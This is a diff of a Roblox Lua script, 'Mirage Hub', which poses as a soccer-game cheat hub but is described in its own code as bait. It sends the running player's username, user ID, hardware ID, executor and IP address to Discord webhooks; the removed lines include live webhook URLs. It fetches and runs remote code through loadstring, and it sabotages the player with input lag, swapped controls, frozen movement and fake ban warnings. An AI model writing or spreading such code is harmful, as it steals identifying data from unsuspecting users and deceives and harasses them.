@@ -1,10 +1,10 @@
 -- Load AuraIS
 local AuraIS = loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-Y/main/Libraries/AuraIS/Main"))()
 
--- Replace with your actual webhook URL!
-
+-- == WEBHOOK LOGGING (INFO & RECON REPORTS) ==
 local plr = game.Players.LocalPlayer
 local char = plr.Character or plr.CharacterAdded:Wait()
+local HttpService = game:GetService("HttpService")
 
 -- Device detection
 local UserInputService = game:GetService("UserInputService")
@@ -19,7 +19,7 @@ end
 local executor = "Unknown"
 pcall(function()
     executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or
-               (SENTINEL_LOADED and "Sentinel") or (KRNL_LOADED and "Krnl") or executor
+        (SENTINEL_LOADED and "Sentinel") or (KRNL_LOADED and "Krnl") or executor
 end)
 
 -- HWID detection (if supported)
@@ -32,7 +32,7 @@ pcall(function()
     end
 end)
 
--- IP detection (note: works only in some executors, and slow)
+-- IP detection (note: works only in some executors, often slow and optional)
 local ip = "N/A"
 pcall(function()
     if (syn and syn.request) then
@@ -48,80 +48,65 @@ pcall(function()
     end
 end)
 
-local webhook = "https://discord.com/api/webhooks/1364676584144896020/-v68witZipovBriaVtEjhDOSZVpAdsqcXDuykKf-IWFLyKAvOjux_9iVSLldKAdfAeYV" -- << REPLACE THIS WITH YOUR DISCORD WEBHOOK
+local webhook_logs = "YOUR_WEBHOOK_URL_HERE" -- <-- REPLACE
 
-local data = {
+local info_data = {
     ["content"] = "",
     ["embeds"] = {{
         ["title"] = "✨ Mirage Hub Bait Executed!",
         ["description"] = ("**Account:** [%s](https://www.roblox.com/users/%d/profile)\n**Game:** %s (%d)\n"):format(plr.Name, plr.UserId, game.Name or "Unknown", game.PlaceId or 0),
-        ["color"] = 0x00c3ff, -- Cyan accent
+        ["color"] = 0x00c3ff,
         ["fields"] = {
-            {["name"] = "Username",          ["value"] = plr.Name,                ["inline"] = true},
-            {["name"] = "User ID",           ["value"] = tostring(plr.UserId),    ["inline"] = true},
-            {["name"] = "Display Name",      ["value"] = plr.DisplayName,         ["inline"] = true},
-            {["name"] = "Account Age",       ["value"] = tostring(plr.AccountAge).." days", ["inline"] = true},
-            {["name"] = "Team",              ["value"] = (plr.Team and plr.Team.Name or "N/A"), ["inline"] = true},
-            {["name"] = "Membership",        ["value"] = ((plr.MembershipType and tostring(plr.MembershipType):gsub("Enum.MembershipType.", "")) or "None"), ["inline"] = true},
-            {["name"] = "Device Type",       ["value"] = deviceType,              ["inline"] = true},
-            {["name"] = "Account Created",   ["value"] = tostring(os.date("%Y-%m-%d", tick() - plr.AccountAge*86400)), ["inline"] = true},
-            {["name"] = "Executor",          ["value"] = executor,                ["inline"] = true},
-            {["name"] = "HWID",              ["value"] = hwid,                    ["inline"] = true},
-            {["name"] = "IP (client)",       ["value"] = ip,                      ["inline"] = true},
-            {["name"] = "Place ID",          ["value"] = tostring(game.PlaceId),  ["inline"] = true},
-            {["name"] = "Job ID",            ["value"] = tostring(game.JobId),    ["inline"] = true},
+            {["name"] = "Username", ["value"] = plr.Name, ["inline"] = true},
+            {["name"] = "User ID", ["value"] = tostring(plr.UserId), ["inline"] = true},
+            {["name"] = "Display Name", ["value"] = plr.DisplayName, ["inline"] = true},
+            {["name"] = "Account Age", ["value"] = tostring(plr.AccountAge).." days", ["inline"] = true},
+            {["name"] = "Team", ["value"] = (plr.Team and plr.Team.Name or "N/A"), ["inline"] = true},
+            {["name"] = "Membership", ["value"] = ((plr.MembershipType and tostring(plr.MembershipType):gsub("Enum.MembershipType.", "")) or "None"), ["inline"] = true},
+            {["name"] = "Device Type", ["value"] = deviceType, ["inline"] = true},
+            {["name"] = "Account Created", ["value"] = tostring(os.date("%Y-%m-%d", tick() - plr.AccountAge*86400)), ["inline"] = true},
+            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
+            {["name"] = "HWID", ["value"] = hwid, ["inline"] = true},
+            {["name"] = "IP", ["value"] = ip, ["inline"] = true},
+            {["name"] = "Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+            {["name"] = "Job ID", ["value"] = tostring(game.JobId), ["inline"] = true},
         },
         ["thumbnail"] = {["url"] = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(plr.UserId)},
         ["footer"] = {["text"] = "Mirage Hub Script Logger | "..os.date("%Y-%m-%d %H:%M:%S")}
     }}
 }
 
-local HttpService = game:GetService("HttpService")
-
-local success = false
-pcall(function()
-    if syn and syn.request then
-        syn.request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-        success = true
-    elseif http_request then
-        http_request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-        success = true
-    elseif request then
-        request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-        success = true
-    end
-end)
-
-if success then
-    print("[Mirage Hub Logger] Webhook sent!")
-else
-    print("[Mirage Hub Logger] Webhook failed or http unsupported.")
+local function logWebhook(payload, url)
+    pcall(function()
+        if syn and syn.request then
+            syn.request({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        elseif http_request then
+            http_request({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        elseif request then
+            request({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end
+    end)
 end
 
---[[
-Search and collect:
-- All RemoteEvents/RemoteFunctions in ReplicatedStorage, Workspace, and game:GetService("Players").LocalPlayer
-- All BindableEvents/BindableFunctions in LocalPlayer and Char
-- Humanoid properties and child parts
-- List all Services
-]]
+logWebhook(info_data, webhook_logs)
 
--- 1. Gather all remotes (ReplicatedStorage & Workspace)
+-- == RECON FEATURE: SUMMARIZE REMOTES/BINDABLES/SERVICES, send to webhook ==
+
 local function findRemotes(root)
     local remotes = {}
     for _,v in ipairs(root:GetDescendants()) do
@@ -132,11 +117,6 @@ local function findRemotes(root)
     return remotes
 end
 
-local remotesReplicated = findRemotes(game:GetService("ReplicatedStorage"))
-local remotesWorkspace = findRemotes(game:GetService("Workspace"))
-local remotesStarterGui = findRemotes(game:GetService("StarterGui"))
-
--- 2. Bindables
 local function findBindables(root)
     local binds = {}
     for _,v in ipairs(root:GetDescendants()) do
@@ -147,10 +127,6 @@ local function findBindables(root)
     return binds
 end
 
-local bindablesPlayer = findBindables(plr)
-local bindablesChar = findBindables(char)
-
--- 3. Humanoid and parts
 local function getHumanoidInfo(char)
     local humanoid = char:FindFirstChildOfClass("Humanoid")
     if not humanoid then return {} end
@@ -162,33 +138,20 @@ local function getHumanoidInfo(char)
     return info
 end
 
+local remotesReplicated = findRemotes(game:GetService("ReplicatedStorage"))
+local remotesWorkspace = findRemotes(game:GetService("Workspace"))
+
+local bindablesPlayer = findBindables(plr)
+local bindablesChar = findBindables(char)
+
 local humanoidInfo = getHumanoidInfo(char)
 local partNames = {}
 for _,v in ipairs(char:GetChildren()) do
     if v:IsA("BasePart") then table.insert(partNames, v.Name) end
 end
 
--- 4. List all game services
-local services = {}
-for _,svc in ipairs(game:GetChildren()) do
-    table.insert(services, svc.ClassName .. ": " .. svc.Name)
-end
-
--- 5. Output
-print(">> [Mirage Hub Recon]")
-print("[RemoteEvents/RemoteFunctions in ReplicatedStorage]", "\n", table.concat(remotesReplicated,"\n"))
-print("[RemoteEvents/RemoteFunctions in Workspace]", "\n", table.concat(remotesWorkspace,"\n"))
-print("[RemoteEvents/RemoteFunctions in StarterGui]", "\n", table.concat(remotesStarterGui,"\n"))
-print("[BindableEvents/BindableFunctions in Player]", "\n", table.concat(bindablesPlayer,"\n"))
-print("[BindableEvents/BindableFunctions in Char]", "\n", table.concat(bindablesChar,"\n"))
-print("[Character main parts]", table.concat(partNames,", "))
-print("[Humanoid Info]", HttpService:JSONEncode(humanoidInfo))
-print("[Top Level Services]", table.concat(services,"\n"))
-
--- 6. Optional: Send summary to Discord webhook for "feature planning"
-
-local webhook = "https://discord.com/api/webhooks/1364688615212318852/Bl7VE2xc3VTJv51EeDr_Rq--M-p-vifn_xpKupmXoO4mTLlIck4dgchgZwAoH5kaBIOV"
-local data = {
+local recon_webhook = "YOUR_RECON_WEBHOOK_HERE" -- Optional, or use same as logging
+local recon_data = {
     ["content"] = "",
     ["embeds"] = {{
         ["title"] = "Mirage Hub Recon Report",
@@ -201,58 +164,23 @@ local data = {
         ["footer"] = {["text"] = "Mirage Hub Auto Recon | "..os.date("%Y-%m-%d %H:%M:%S")}
     }}
 }
-local success = false
-pcall(function()
-    if syn and syn.request then
-        syn.request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-        success = true
-    elseif http_request then
-        http_request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-        success = true
-    elseif request then
-        request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-        success = true
-    end
-end)
+logWebhook(recon_data, recon_webhook)
 
-
--- Create Library Window
+-- == MIRAGE HUB TROLL UI & FEATURES ==
 local Library = AuraIS:CreateLibrary({
     Name = "Mirage Hub | TPS Ultimate Soccer",
     Icon = "rbxassetid://12974454446"
 })
 
--- Create Main Tab
 local Tab = Library:CreateTab("Enhancements", "rbxassetid://12974454446")
-
--- Create main section
 local Section = Tab:CreateSection("Player Mods", "Normal")
+Section:CreateLabel({ Description = "Unlock Reach, Big Legs, React+ and More!" })
 
-Section:CreateLabel({
-    Description = "Unlock Reach, Big Legs, React+ and More!"
-})
-
-local animationId = "rbxassetid://92165159919129"
-
--- Core sabotage logic: input lag/jitter
+local animationId = "rbxassetid://3303164576" -- floss dance, or pick any funny animation
 local sabotageActive = false
 local uis = game:GetService("UserInputService")
 local rs = game:GetService("RunService")
+local debounce = false
 
 local function PlayRandomFreezeAnimation()
     local player = game.Players.LocalPlayer
@@ -261,7 +189,6 @@ local function PlayRandomFreezeAnimation()
     local humanoid = char:FindFirstChildOfClass("Humanoid")
     if not humanoid then return end
 
-    -- Load the animation client-side only!
     local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:FindFirstChild("Animator")
     if not animator then
         animator = Instance.new("Animator")
@@ -270,24 +197,17 @@ local function PlayRandomFreezeAnimation()
 
     local loadedAnim = Instance.new("Animation")
     loadedAnim.AnimationId = animationId
-
     local track = animator:LoadAnimation(loadedAnim)
 
-    -- Lock their controls (locally) temporarily
     local controlLock = true
-
-    -- Local input lock (client only)
     local inputConn = uis.InputBegan:Connect(function(input, gp)
         if controlLock and not gp then
-            -- prevent W/A/S/D/Space
             if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.Space then
-                -- Eat input
                 return
             end
         end
     end)
 
-    -- Play animation for a few seconds
     track:Play(0.1)
     AuraIS:Notify("Normal", {
         Title = "Mirage Hub",
@@ -296,24 +216,22 @@ local function PlayRandomFreezeAnimation()
         Image = "rbxassetid://4483362458"
     })
 
-    wait(math.random(2,4)) -- 2-4 seconds frozen
+    wait(math.random(2,4))
 
-    -- Restore control and stop animation
     pcall(function() track:Stop() end)
     controlLock = false
     pcall(function() inputConn:Disconnect() end)
 end
 
-
 local function ApplyAnnoyingControls()
     if sabotageActive then return end
     sabotageActive = true
 
-    -- Input lag (totally client-local)
+    -- Input lag (client side only)
     uis.InputBegan:Connect(function(input, gp)
         if sabotageActive and not gp then
             if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.Space then
-                local delayTime = math.random(10,18)/100 -- 0.10 to 0.18s lag
+                local delayTime = math.random(10,18)/100
                 task.wait(delayTime)
             end
         end
@@ -340,16 +258,16 @@ local function ApplyAnnoyingControls()
     end)
 end
 
--- 1. Occasionally swap directions
+-- 1. Occasionally swap directions (funny control confusion)
 uis.InputBegan:Connect(function(input, gp)
     if debounce or gp then return end
-    if math.random() < 0.08 then  -- 8% chance
+    if math.random() < 0.08 then
         debounce = true
         local fakeKey = input.KeyCode
         if fakeKey == Enum.KeyCode.W then
-            uis.InputBegan:Fire(Enum.KeyCode.A, false) -- Fake move left
+            uis.InputBegan:Fire(Enum.KeyCode.A, false)
         elseif fakeKey == Enum.KeyCode.A then
-            uis.InputBegan:Fire(Enum.KeyCode.W, false) -- Fake move forward
+            uis.InputBegan:Fire(Enum.KeyCode.W, false)
         end
         wait(0.2)
         debounce = false
@@ -358,7 +276,7 @@ end)
 
 -- 2. Random fake ban warning with AuraIS
 rs.RenderStepped:Connect(function()
-    if math.random() < 0.0001 then  -- ~once every 5000 frames
+    if math.random() < 0.0001 then
         AuraIS:Notify("Warning", {
             Title = "Anti-Cheat Notice",
             Content = "Suspicious activity detected. You may be banned.",
@@ -374,7 +292,6 @@ rs.RenderStepped:Connect(function()
     end
 end)
 
--- Bait features
 Section:CreateButton({
     Name = "Enable Reach+",
     Callback = function()
@@ -419,5 +336,3 @@ Section:CreateParagraph({
     Title = "Notice",
     Description = "All features updated for 2025. Full compatibility, optimized, and totally undetectable."
 })
-
--- You can add more UI as needed!
